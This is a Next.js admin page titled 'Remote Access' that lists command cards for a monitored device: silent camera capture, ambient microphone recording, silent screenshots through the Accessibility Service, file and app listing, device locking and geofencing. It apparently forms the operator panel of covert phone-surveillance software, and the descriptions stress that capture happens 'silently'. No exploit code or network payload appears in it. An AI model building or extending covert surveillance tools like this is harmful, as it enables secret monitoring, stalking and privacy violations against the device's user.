'use client';
import { useEffect, useState } from 'react';
import { useParams, useRouter } from 'next/navigation';
import {
  ArrowLeft, Camera, Mic, FolderOpen, Shield,
  Wifi, WifiOff, ChevronRight, Radio, Monitor, AppWindow, MapPin,
} from 'lucide-react';
import { adminApi } from '@/lib/adminApi';
import PageLoader from '@/components/PageLoader';

interface DeviceInfo {
  deviceId: string; name: string; isOnline: boolean; lastSeen: string | null;
}

interface Cmd { commandType: string; status: string; }

const CARDS = [
  {
    key: 'camera',
    label: 'Camera Capture',
    desc: 'Silently capture photo from front or back camera',
    icon: Camera,
    gradient: 'from-pink-600 to-rose-700',
    iconBg: 'bg-pink-500/20',
    iconColor: 'text-pink-400',
    types: ['capture_photo'],
  },
  {
    key: 'audio',
    label: 'Audio Recording',
    desc: 'Start / stop ambient microphone recording',
    icon: Mic,
    gradient: 'from-red-600 to-orange-700',
    iconBg: 'bg-red-500/20',
    iconColor: 'text-red-400',
    types: ['start_recording', 'stop_recording', 'start_mic', 'stop_mic'],
  },
  {
    key: 'files',
    label: 'File Browsing',
    desc: 'List files and folders on device storage',
    icon: FolderOpen,
    gradient: 'from-yellow-600 to-amber-700',
    iconBg: 'bg-yellow-500/20',
    iconColor: 'text-yellow-400',
    types: ['list_files'],
  },
  {
    key: 'quick',
    label: 'Quick Commands',
    desc: 'Lock device, block or unblock apps instantly',
    icon: Shield,
    gradient: 'from-indigo-600 to-violet-700',
    iconBg: 'bg-indigo-500/20',
    iconColor: 'text-indigo-400',
    types: ['lock_device', 'block_app', 'unblock_app'],
  },
  {
    key: 'screenshot',
    label: 'Screenshot',
    desc: 'Capture the current screen silently via Accessibility Service',
    icon: Monitor,
    gradient: 'from-cyan-600 to-teal-700',
    iconBg: 'bg-cyan-500/20',
    iconColor: 'text-cyan-400',
    types: ['take_screenshot'],
  },
  {
    key: 'apps',
    label: 'Installed Apps',
    desc: 'List all user-installed apps on the device',
    icon: AppWindow,
    gradient: 'from-emerald-600 to-green-700',
    iconBg: 'bg-emerald-500/20',
    iconColor: 'text-emerald-400',
    types: ['list_apps'],
  },
  {
    key: 'geofencing',
    label: 'Geofencing',
    desc: 'Set location zones and get enter/exit alerts',
    icon: MapPin,
    gradient: 'from-green-600 to-teal-700',
    iconBg: 'bg-green-500/20',
    iconColor: 'text-green-400',
    types: [] as string[],
  },
] as const;

export default function RemoteHubPage() {
  const { userId, deviceId } = useParams<{ userId: string; deviceId: string }>();
  const router = useRouter();

  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [commands, setCommands] = useState<Cmd[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    Promise.all([
      adminApi.userDetail(userId),
      adminApi.deviceCommands(deviceId),
    ]).then(([uRes, cRes]) => {
      const dev = uRes.data.devices?.find((d: DeviceInfo) => d.deviceId === deviceId);
      setDevice(dev ?? null);
      setCommands(cRes.data ?? []);
    }).catch(() => {}).finally(() => setLoading(false));
  }, [userId, deviceId]);

  function countOf(types: readonly string[]) {
    return commands.filter((c) => types.includes(c.commandType)).length;
  }
  function pendingOf(types: readonly string[]) {
    return commands.filter((c) => types.includes(c.commandType) &&
      ['pending','delivered','executing'].includes(c.status)).length;
  }

  if (loading) return <div className="flex-1"><PageLoader theme="dark" /></div>;

  return (
    <div className="flex-1 flex flex-col min-h-0">
      {/* Header */}
      <div className="px-8 pt-8 pb-6 border-b border-gray-800">
        <button onClick={() => router.push(`/admin/users/${userId}`)}
          className="flex items-center gap-2 text-gray-400 hover:text-white text-sm mb-5 transition-colors">
          <ArrowLeft size={15} /> Back to User
        </button>

        <div className="flex items-center gap-4">
          <div className="w-14 h-14 bg-gradient-to-br from-indigo-700/40 to-purple-700/40 rounded-2xl flex items-center justify-center border border-indigo-700/30">
            <Radio size={26} className="text-indigo-400" />
          </div>
          <div>
            <h1 className="text-2xl font-extrabold text-white">Remote Access</h1>
            <div className="flex items-center gap-3 mt-1">
              <span className="text-gray-400 text-sm">{device?.name ?? deviceId}</span>
              {device?.isOnline
                ? <span className="flex items-center gap-1.5 text-green-400 text-xs font-semibold">
                    <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                    <Wifi size={11} /> Live
                  </span>
                : <span className="flex items-center gap-1.5 text-gray-500 text-xs">
                    <WifiOff size={11} /> Offline
                  </span>}
            </div>
          </div>
        </div>

        {!device?.isOnline && (
          <div className="mt-4 bg-yellow-900/20 border border-yellow-800/40 rounded-xl px-4 py-2.5 text-yellow-300 text-sm">
            Device is offline — commands will queue and execute when it reconnects.
          </div>
        )}
      </div>

      {/* Cards grid */}
      <div className="flex-1 p-8 overflow-y-auto">
        <p className="text-gray-500 text-sm mb-6">
          Select a command category to perform actions and view results.
        </p>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
          {CARDS.map((card) => {
            const total   = countOf(card.types);
            const pending = pendingOf(card.types);
            const Icon    = card.icon;

            return (
              <button
                key={card.key}
                onClick={() => router.push(`/admin/users/${userId}/remote/${deviceId}/${card.key}`)}
                className="group relative bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-gray-700 rounded-2xl p-6 text-left transition-all duration-200 hover:shadow-lg hover:-translate-y-0.5 active:translate-y-0"
              >
                {/* Gradient top accent */}
                <div className={`absolute top-0 left-0 right-0 h-0.5 rounded-t-2xl bg-gradient-to-r ${card.gradient} opacity-0 group-hover:opacity-100 transition-opacity`} />

                <div className="flex items-start justify-between gap-4">
                  <div className={`w-12 h-12 ${card.iconBg} rounded-xl flex items-center justify-center flex-shrink-0`}>
                    <Icon size={22} className={card.iconColor} />
                  </div>
                  <ChevronRight size={18} className="text-gray-600 group-hover:text-gray-400 transition-colors mt-1 flex-shrink-0" />
                </div>

                <div className="mt-4">
                  <h3 className="text-white font-bold text-base">{card.label}</h3>
                  <p className="text-gray-500 text-sm mt-1 leading-relaxed">{card.desc}</p>
                </div>

                <div className="mt-4 flex items-center gap-3">
                  {total > 0 && (
                    <span className="text-xs text-gray-500">
                      <span className="text-gray-300 font-semibold">{total}</span> commands
                    </span>
                  )}
                  {pending > 0 && (
                    <span className="flex items-center gap-1 text-xs text-yellow-400">
                      <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />
                      {pending} pending
                    </span>
                  )}
                  {total === 0 && (
                    <span className="text-xs text-gray-600">No commands yet</span>
                  )}
                </div>
              </button>
            );
          })}
        </div>
      </div>
    </div>
  );
}
